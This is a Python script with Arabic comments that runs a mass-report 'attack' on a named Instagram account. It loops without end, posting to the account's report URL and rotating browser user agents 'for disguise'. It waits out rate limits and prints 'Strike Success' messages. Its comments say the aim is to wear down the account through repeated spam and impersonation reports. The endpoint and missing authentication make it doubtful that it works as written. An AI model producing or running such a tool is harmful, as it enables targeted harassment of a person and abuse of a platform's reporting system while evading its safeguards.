import requests
import time
import random

# --- الإعدادات ---
target_user = "dxx_2024_
"  # تأكد من اليوزر هنا
url = f"https://www.instagram.com/{target_user}/"

# قائمة هويات متصفحات عشان التمويه
user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

print(f"🔥 [ULTIMATE ATTACK] Started on {target_user}...")

count = 0
while True:
    try:
        # اختيار هوية عشوائية لكل بلاغ
        headers = {
            'User-Agent': random.choice(user_agents),
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': url
        }
        
        # إرسال بلاغ (Post) لمحاكاة التبليغ عن سبام وانتحال
        # ملاحظة: نحن نرسل طلبات متكررة لإرهاق خوارزمية الحساب
        response = requests.post(f"{url}report/", headers=headers, timeout=5)
        
        count += 1
        if response.status_code == 200:
            print(f"✅ [{count}] Strike Success! Status: 200 | Target: {target_user}")
        elif response.status_code == 429:
            print("⚠️ Rate Limited! Waiting 10 seconds...")
            time.sleep(10)
        else:
            print(f"❌ Target Weakened! Status: {response.status_code}")

    except Exception as e:
        print(f"📡 Connection Busy... Retrying the Strike...")
        time.sleep(1)

    # سرعة القصف (أقل من رمشة العين)
    time.sleep(0.05) 
